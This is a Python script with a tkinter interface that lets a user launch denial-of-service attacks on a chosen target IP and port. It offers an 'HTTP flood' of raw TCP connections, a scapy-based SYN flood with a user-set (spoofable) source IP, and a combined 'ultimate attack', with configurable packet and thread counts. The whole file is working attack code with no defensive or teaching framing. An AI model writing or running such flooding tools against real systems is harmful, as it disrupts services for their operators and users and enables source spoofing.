import tkinter as tk
from struct import pack
from tkinter import Button
from scapy.all import *
from scapy.layers.inet import TCP, IP
import threading


root = tk.Tk()


canvas = tk.Canvas(root, height=400, width=520, bg="#263D42")
canvas.place()

frame = tk.Frame(root, bg="white")
frame.place(relwidth=0.8, relheight=0.8, relx=0.1, rely=0.1)

background_image = tk.PhotoImage(file='redmatrix.gif')
background_label = tk.Label(root, image=background_image)
background_label.place(relwidth=1, relheight=1)

###USING BUTTON TO ASSIGN ENTRY IN TEXT BOX FOR SRC IP

def get_srcip(srcipentry):
    global srcip, str
    srcip = srcipentry
    print("The Source IP is:", srcipentry)


###USING BUTTON TO ASSING ENTRY IN TEXT BOX FOR DEST IP

def get_dstip(ipentry):
    global dstip, str
    dstip = ipentry
    print("The Destination IP is:", ipentry)


###USING BUTTON TO ASSING ENTRY IN TEXT BOX FOR PORT NUMBER

def get_port(portentry):
    global dstport
    dstport = portentry
    print("The Destination Port is:", portentry)


###USING BUTTON TO ASSING ENTRY IN TEXT BOX FOR AMOUNT OF PACKETS

def get_pkt(packetentry):
    global packet
    packet = packetentry
    print("Amount of Packets:", packetentry)


###USING BUTTON TO ASSING ENTRY IN TEXT BOX FOR AMOUNT OF THREADS

def get_thrd(threadentry):
    global thread, int
    thread = threadentry
    print("Amount of Threads:", threadentry)

def run_attack(target_func):
    for x in range(int(thread)):
        thred = threading.Thread(target=target_func)
        thred.start()

def run_httpf():
    run_attack(httpf_attack)

def run_synf():
    run_attack(synf_attack)

def run_ult():
    run_attack(ult_attack)

###HTTP FLOOD ATTACK

def httpf_attack():
    import socket
    import random
    import threading

    a = random._urandom(10)
    b = 0
    # print(dstip, dstport, num_packets, thread)
    for i in range(int(packet)):
        b += 1
        print('Attacking ' + dstip + ' | Sent: ' + str(b))
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((dstip, int(dstport)))
            s.send(a)
        except Exception as e:
            # print("error: {}".format(e))
            s.close()
            print('Done')


###SYNFLOOD ATTACK

def synf_attack():
    for sport in range(1024, 65635):
        l3 = IP(src=srcip, dst=dstip)
        l4 = TCP(sport=sport, dport=1337)
        pkt = l3 / l4
        send(pkt)

###Ultimate Attack

def ult_attack():

    threading.Thread(target=httpf_attack()).start()
    threading.Thread(target=synf_attack()).start()

###SOURCE IP ENTRY

lbl = tk.Label(root, text="Enter Source IP:", font=30, bg='black', fg='red')
lbl.grid(row=0, column=0)

srcipentry = tk.Entry(root, bg="red", fg='black')
srcipentry.grid(row=0, column=1)

button1 = Button(root, text="Enter", bg='black', fg='red', command=lambda: get_srcip(srcipentry.get()))
button1.grid(row=0, column=2)

###DESTINATION IP ENTRY

lbl = tk.Label(root, text="Enter Destination IP:", font=30, bg='black', fg='red')
lbl.grid(row=1, column=0)

ipentry = tk.Entry(root, bg="red", fg='black')
ipentry.grid(row=1, column=1)

button1 = Button(root, text="Enter", bg='black', fg='red', command=lambda: get_dstip(ipentry.get()))
button1.grid(row=1, column=2)

###PORT ENTRY

lbl = tk.Label(root, text="Enter Port Number:", font=30, bg='black', fg='red')
lbl.grid(row=2, column=0)

portentry = tk.Entry(root, bg="red", fg='black')
portentry.grid(row=2, column=1)

button2 = Button(root, text="Enter", bg='black', fg='red', command=lambda: get_port(portentry.get()))
button2.grid(row=2, column=2)

###NUMBER OF PACKETS ENTRY

lbl = tk.Label(root, text="Enter Amount of Packets:", font=30, bg='black', fg='red')
lbl.grid(row=3, column=0)

packetentry = tk.Entry(root, bg="red", fg='black')
packetentry.grid(row=3, column=1)

button3 = Button(root, text="Enter", bg='black', fg='red', command=lambda: get_pkt(packetentry.get()))
button3.grid(row=3, column=2)

###NUMBER OF THREADS ENTRY

lbl = tk.Label(root, text="Enter Number of Threads:", font=30, bg='black', fg='red')
lbl.grid(row=4, column=0)

threadentry = tk.Entry(root, bg="red", fg='black')
threadentry.grid(row=4, column=1)

button4 = Button(root, text="Enter", bg='black', fg='red', command=lambda: get_thrd(threadentry.get()))
button4.grid(row=4, column=2)

###ATTACK USING HTTPFLOOD BUTTON

button5 = Button(root, text="HTTP FLOOD ATTACK", command=httpf_attack, bg='black', fg='red')
button5.grid(row=5, column=0)

###ATTACK USING SYNFLOOD BUTTON

button6 = Button(root, text="SYN FLOOD ATTACK", command=synf_attack, bg='black', fg='red')
button6.grid(row=5, column=1)

###ATTACK USING BOTH SYN AND HTTP FLOOD

button7 = Button(root, text="ULTIMATE ATTACK", command=ult_attack, bg='black', fg='red')
button7.grid(row=5, column=2)

root.mainloop()